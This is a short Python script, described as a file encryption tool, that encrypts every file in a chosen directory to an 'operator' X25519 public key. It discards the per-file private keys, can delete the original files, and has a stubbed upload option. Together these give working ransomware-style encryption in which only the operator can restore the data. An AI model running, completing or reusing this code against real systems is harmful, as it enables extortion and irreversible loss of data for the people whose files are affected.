#!/usr/bin/env python3

import argparse
import os
from pathlib import Path
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import x25519
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.fernet import Fernet
import base64

def load_operator_public_key(key_path):
    """Load operator's public key from raw bytes"""
    key_bytes = Path(key_path).read_bytes()
    return x25519.X25519PublicKey.from_public_bytes(key_bytes)

def generate_file_key_pair():
    """Generate a new X25519 key pair for a file"""
    private_key = x25519.X25519PrivateKey.generate()
    public_key = private_key.public_key()
    return private_key, public_key

def compute_shared_secret(private_key, peer_public_key):
    """Compute X25519 shared secret and derive encryption key"""
    shared_secret = private_key.exchange(peer_public_key)
    
    # Derive encryption key using HKDF
    derived_key = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=None,
        info=b'file-encryption',
    ).derive(shared_secret)
    
    # Convert to Fernet key (32 bytes base64-encoded)
    return base64.urlsafe_b64encode(derived_key)

def encrypt_file(file_path, encryption_key, output_path, file_public_key_bytes):
    """Encrypt file and append public key bytes"""
    fernet = Fernet(encryption_key)
    
    # Read and encrypt file content
    with open(file_path, 'rb') as f:
        file_data = f.read()
    encrypted_data = fernet.encrypt(file_data)
    
    # Write encrypted data and append public key bytes
    with open(output_path, 'wb') as f:
        f.write(encrypted_data)
        f.write(file_public_key_bytes)

def process_file(file_path, operator_public_key, upload=False, delete=False):
    """Process a single file: encrypt and handle upload/delete options"""
    try:
        # Generate unique key pair for this file
        file_private_key, file_public_key = generate_file_key_pair()
        
        # Compute shared secret and derive encryption key
        encryption_key = compute_shared_secret(file_private_key, operator_public_key)
        
        # Prepare output path
        output_path = Path(f"{file_path}.enc")
        
        # Get public key as raw bytes
        file_public_key_bytes = file_public_key.public_bytes_raw()
        
        # Encrypt file and append public key
        encrypt_file(
            file_path, 
            encryption_key,
            output_path,
            file_public_key_bytes
        )
        
        print(f"Successfully encrypted: {file_path}")
        
        if upload:
            # TODO: Implement file upload functionality
            print(f"Upload functionality not implemented yet")
            
        if delete and os.path.exists(file_path):
            os.remove(file_path)
            print(f"Deleted original file: {file_path}")
            
        return True
        
    except Exception as e:
        print(f"Error processing {file_path}: {str(e)}")
        return False

def main():
    parser = argparse.ArgumentParser(description='File encryption tool')
    parser.add_argument('operator_public', help='Path to operator public key')
    parser.add_argument('test_directory', help='Directory containing files to encrypt')
    parser.add_argument('--upload-files', action='store_true',
                      help='Upload encrypted files (not implemented)')
    parser.add_argument('--delete-files', action='store_true',
                      help='Delete original files after encryption')
    args = parser.parse_args()
    
    # Load operator's public key
    try:
        operator_public_key = load_operator_public_key(args.operator_public)
    except Exception as e:
        print(f"Error loading operator public key: {str(e)}")
        return 1
    
    # Process all files in directory
    directory = Path(args.test_directory)
    if not directory.is_dir():
        print(f"Error: {directory} is not a directory")
        return 1
    
    files_processed = 0
    files_succeeded = 0
    
    for file_path in directory.iterdir():
        if file_path.is_file() and not file_path.name.endswith('.enc'):
            files_processed += 1
            if process_file(
                file_path, 
                operator_public_key,
                args.upload_files,
                args.delete_files
            ):
                files_succeeded += 1
    
    print(f"\nEncryption complete!")
    print(f"Files processed: {files_processed}")
    print(f"Successfully encrypted: {files_succeeded}")
    print(f"Failed: {files_processed - files_succeeded}")
    
    return 0 if files_processed == files_succeeded else 1

if __name__ == '__main__':
    exit(main())